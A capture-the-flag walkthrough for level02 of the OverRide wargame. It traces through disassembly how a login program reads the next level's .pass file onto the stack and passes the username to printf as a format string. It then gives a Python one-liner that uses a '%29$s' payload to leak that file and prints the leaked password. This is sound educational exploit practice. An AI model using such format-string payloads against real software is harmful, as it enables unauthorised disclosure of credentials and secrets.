# Level 02 Walkthrough

Through running the program we see it askes for a username and a password.
```
level02@OverRide:~$ ./level02
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: admin
--[ Password: admin
*****************************************
admin does not have access!
```

Disassembling the program we find that it reads the content of `"/home/users/level03/.pass"` file and stores it at `rbp-0xa0` in the stack.
```
...
   0x0000000000400898 <+132>:   mov    edx,0x400bb0                   // 0x400bb0:       "r"
   0x000000000040089d <+137>:   mov    eax,0x400bb2                   // 0x400bb2:       "/home/users/level03/.pass"
   0x00000000004008a2 <+142>:   mov    rsi,rdx
   0x00000000004008a5 <+145>:   mov    rdi,rax
   0x00000000004008a8 <+148>:   call   0x400700 <fopen@plt>          // FILE *fopen(const char *pathname, const char *mode);
...
   0x00000000004008e6 <+210>:   lea    rax,[rbp-0xa0]                 // the location of the buffer which will hold the content of ".pass"
   0x00000000004008ed <+217>:   mov    rdx,QWORD PTR [rbp-0x8]        // the fopen FILE of "/home/users/level03/.pass" 
   0x00000000004008f1 <+221>:   mov    rcx,rdx
   0x00000000004008f4 <+224>:   mov    edx,0x29                       // 41 bytes to read 
   0x00000000004008f9 <+229>:   mov    esi,0x1                        // the unit
   0x00000000004008fe <+234>:   mov    rdi,rax
   0x0000000000400901 <+237>:   call   0x400690 <fread@plt>           // size_t fread(void *ptr, size_t size, size_t nmemb, FILE *stream);
...
```

The username is stored at `rbp-0x70` and the password is stored at `rbp-0x110`
```
...
   0x00000000004009b1 <+413>:   mov    eax,0x400cd9                   // 0x400cd9:       "--[ Username: "
   0x00000000004009b6 <+418>:   mov    rdi,rax
   0x00000000004009b9 <+421>:   mov    eax,0x0
   0x00000000004009be <+426>:   call   0x4006c0 <printf@plt>
   0x00000000004009c3 <+431>:   mov    rax,QWORD PTR [rip+0x20087e]        # 0x601248 <stdin@@GLIBC_2.2.5>
   0x00000000004009ca <+438>:   mov    rdx,rax
   0x00000000004009cd <+441>:   lea    rax,[rbp-0x70]
   0x00000000004009d1 <+445>:   mov    esi,0x64
   0x00000000004009d6 <+450>:   mov    rdi,rax
   0x00000000004009d9 <+453>:   call   0x4006f0 <fgets@plt>           // char *fgets(char *s, int size, FILE *stream);
...
   0x00000000004009f4 <+480>:   mov    eax,0x400ce8                   // 0x400ce8:       "--[ Password: "
   0x00000000004009f9 <+485>:   mov    rdi,rax
   0x00000000004009fc <+488>:   mov    eax,0x0
   0x0000000000400a01 <+493>:   call   0x4006c0 <printf@plt>
   0x0000000000400a06 <+498>:   mov    rax,QWORD PTR [rip+0x20083b]        # 0x601248 <stdin@@GLIBC_2.2.5>
   0x0000000000400a0d <+505>:   mov    rdx,rax
   0x0000000000400a10 <+508>:   lea    rax,[rbp-0x110]
   0x0000000000400a17 <+515>:   mov    esi,0x64
   0x0000000000400a1c <+520>:   mov    rdi,rax
   0x0000000000400a1f <+523>:   call   0x4006f0 <fgets@plt>
```

A vulnerability exist at the end where our username input is passed to printf as its format string argument.
```
...
   0x0000000000400a96 <+642>:   lea    rax,[rbp-0x70]                 // our username input
   0x0000000000400a9a <+646>:   mov    rdi,rax                        // the username input as printf first argument
   0x0000000000400a9d <+649>:   mov    eax,0x0
   0x0000000000400aa2 <+654>:   call   0x4006c0 <printf@plt>
...
```

We'll exploit it via leaking the content of `"/home/users/level03/.pass"` stored at `rbp-0xa0` in the stack.
```
level02@OverRide:~$ python -c "import struct; print '%29\$s...'+struct.pack('Q', 0x7fffffffe540+48)" | ./level02 | tail -n 1 | cut -d '.' -f 1

Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
```